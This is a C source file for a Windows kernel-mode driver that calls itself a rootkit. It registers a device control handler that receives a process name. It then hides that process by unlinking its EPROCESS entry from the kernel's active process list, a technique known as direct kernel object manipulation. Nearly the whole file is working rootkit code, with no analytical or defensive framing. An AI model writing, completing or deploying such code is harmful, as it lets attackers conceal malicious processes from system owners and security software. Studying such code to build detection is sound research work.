#include <stdio.h>
#include <stdlib.h>
#include <ntddk.h>
#include <winapifamily.h>

#include "header.h"

UNICODE_STRING ntRootkit;
UNICODE_STRING dosRootkit;

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
DRIVER_DISPATCH IRP_create_close;
DRIVER_DISPATCH IRP_control;
VOID rookit(char *proc);

NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] rootkit : DriverEntry\n"));
	NTSTATUS status;
	PDEVICE_OBJECT pdeviceObject = NULL;
	RtlInitUnicodeString(&ntRootkit, NT_DEVICE_NAME);
	RtlInitUnicodeString(&dosRootkit, DOS_DEVICE_NAME);

	status = IoCreateDevice(
		pDriverObject,
		0,
		&ntRootkit,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&pdeviceObject);

	if (!NT_SUCCESS(status)) {
		return status;
	}

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = IRP_create_close;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_create_close;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IRP_control;
	pDriverObject->DriverUnload = DriverUnload;

	status = IoCreateSymbolicLink(&dosRootkit, &ntRootkit);

	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(pdeviceObject);
		return status;
	}

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] rootkit : ALL RIGHT (^o^)!!!!\n"));
	return status;
}

VOID DriverUnload(PDRIVER_OBJECT  pDriverObject) {
	UNREFERENCED_PARAMETER(pDriverObject);
	IoDeleteSymbolicLink(&dosRootkit);
	IoDeleteDevice(pDriverObject->DeviceObject);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] rootkit : DriverUnload\n"));
}

NTSTATUS IRP_create_close(PDEVICE_OBJECT pdeviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(pdeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	return status;
}

NTSTATUS IRP_control(PDEVICE_OBJECT pdeviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(pdeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufLength, outBufLength, code;
	PCHAR               inBuf;

	irpSp = IoGetCurrentIrpStackLocation(irp);
	inBufLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	code = irpSp->Parameters.DeviceIoControl.IoControlCode;

	switch (code)
	{
	case IRP_CODE_HIDE:
		inBuf = irp->AssociatedIrp.SystemBuffer;
		irp->IoStatus.Information = strlen(inBuf);
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] incoming IRP : %s", inBuf));

		// call rootkit()
		rookit(inBuf);
		break;
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[-] Error : STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}
	return status;
}

VOID rookit(char *proc) {
	PEPROCESS cEProcess = (PEPROCESS)PsGetCurrentProcess(), origEProcess = cEProcess;
	PLIST_ENTRY cActiveProcessLinks;
	PUCHAR cImageFileName;
	PUINT32 cPid;

	do {
		cImageFileName = (PUCHAR)((DWORD64)cEProcess + ImageFileName);
		cPid = (PUINT32)((DWORD64)cEProcess + UniqueProcessId);
		cActiveProcessLinks = (PLIST_ENTRY)((DWORD64)cEProcess + ActiveProcessLinks);
		cEProcess = (PEPROCESS)((DWORD64)cActiveProcessLinks->Flink - ActiveProcessLinks);

		if (!strcmp((const char*)cImageFileName, TEXT(proc))) {

			// DKOM Eprocess Routine
			*((PDWORD64)cActiveProcessLinks->Blink) = (DWORD64)cActiveProcessLinks->Flink;
			*((PDWORD64)(cActiveProcessLinks->Flink) + 1) = (DWORD64)cActiveProcessLinks->Blink;

			// Loop on process hidden (avoiding BSOD)
			cActiveProcessLinks->Blink = (PLIST_ENTRY)&cActiveProcessLinks->Flink;
			cActiveProcessLinks->Flink = (PLIST_ENTRY)&cActiveProcessLinks->Flink;

			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] %s say goodbye :)\n", proc));
		}
	} while ((DWORD64)origEProcess != (DWORD64)cEProcess);
}